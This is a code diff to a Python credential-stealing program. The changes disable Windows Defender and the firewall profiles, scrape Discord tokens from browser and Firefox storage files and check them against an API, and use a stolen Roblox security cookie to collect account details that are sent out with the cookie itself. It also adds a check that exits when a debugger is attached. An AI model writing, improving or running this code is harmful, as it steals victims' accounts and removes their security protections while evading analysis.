@@ -7,6 +7,7 @@ import random
 import re
 import sqlite3
 import subprocess
+import sys
 import threading
 import uuid
 from shutil import copy2
@@ -104,7 +105,9 @@ def startup():
 
 
 def disable_defender():
-    subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off", shell=True, capture_output=True)
+    subprocess.call(["netsh", "advfirewall", "set", "publicprofile", "state", "off"], shell=True, capture_output=True)
+    subprocess.call(["netsh", "advfirewall", "set", "privateprofile", "state", "off"], shell=True, capture_output=True)
+    subprocess.call(["powershell.exe", "-ExecutionPolicy", "Unrestricted", "-File", "Disable-WindowsDefender.ps1"])
 
 
 def create_temp(_dir: str or os.PathLike = gettempdir()):
@@ -258,14 +261,14 @@ class Discord:
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                         'Content-Type': 'application/json',
                                         'Authorization': token})
+                                    if r.status_code == 200:
+                                        uid = r.json()['id']
+                                        if uid not in self.ids:
+                                            self.tokens.append(token)
+                                            self.ids.append(uid)
                                 except Exception:
                                     pass
-                                if r.status_code == 200:
-                                    uid = r.json()['id']
-                                    if uid not in self.ids:
-                                        self.tokens.append(token)
-                                        self.ids.append(uid)
-            else:
+
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
@@ -276,13 +279,13 @@ class Discord:
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
                                     'Authorization': token})
+                                if r.status_code == 200:
+                                    uid = r.json()['id']
+                                    if uid not in self.ids:
+                                        self.tokens.append(token)
+                                        self.ids.append(uid)
                             except Exception:
                                 pass
-                            if r.status_code == 200:
-                                uid = r.json()['id']
-                                if uid not in self.ids:
-                                    self.tokens.append(token)
-                                    self.ids.append(uid)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -296,13 +299,13 @@ class Discord:
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
                                     'Authorization': token})
+                                if r.status_code == 200:
+                                    uid = r.json()['id']
+                                    if uid not in self.ids:
+                                        self.tokens.append(token)
+                                        self.ids.append(uid)
                             except Exception:
                                 pass
-                            if r.status_code == 200:
-                                uid = r.json()['id']
-                                if uid not in self.ids:
-                                    self.tokens.append(token)
-                                    self.ids.append(uid)
 
     def robloxinfo(self, webhook):
         if robo_cookie == "No Roblox Cookies Found":
@@ -310,8 +313,10 @@ class Discord:
         else:
             embed = Embed(title="Roblox Info", color=5639644)
             headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-            info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
-
+            try:
+                info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+            except Exception:
+                pass
             embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
             embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
             embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
@@ -859,6 +864,8 @@ class Debug:
                     proc.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
+        if sys.gettrace():
+            sys.exit(0)
 
     def get_network(self) -> bool:
         global ip, mac, github
